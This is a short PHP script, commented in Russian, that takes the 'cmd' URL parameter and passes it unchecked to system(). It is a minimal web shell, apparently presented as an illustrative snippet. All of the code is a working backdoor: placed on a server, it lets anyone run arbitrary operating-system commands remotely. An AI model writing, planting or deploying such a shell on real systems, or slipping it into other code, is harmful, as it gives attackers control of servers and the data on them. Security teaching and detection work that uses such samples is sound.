<?php

//Команда передается в качестве параметра
if (isset($_GET['cmd'])) {
    //Обращаемся к system с Linux, которая выполняет введенные команды
    $command = $_GET['cmd'];
    system($command);
}
